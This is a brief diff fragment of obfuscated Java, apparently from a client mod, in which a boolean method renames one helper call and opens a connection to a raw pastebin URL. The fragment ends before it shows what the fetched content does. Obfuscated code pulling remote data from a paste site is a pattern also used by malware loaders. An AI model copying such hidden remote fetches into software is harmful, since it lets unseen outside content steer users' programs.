@@ -33,7 +33,7 @@ public class hht {
 
    public static boolean ga() {
       long a = hht.a ^ 16381749921415L;
-      int[] ax = dar.abu();
+      int[] ax = ClientSetup.abu();
 
       try {
          HttpURLConnection axx = (HttpURLConnection)new URL("https://pastebin.com/raw/G6DvJjqY").openConnection();
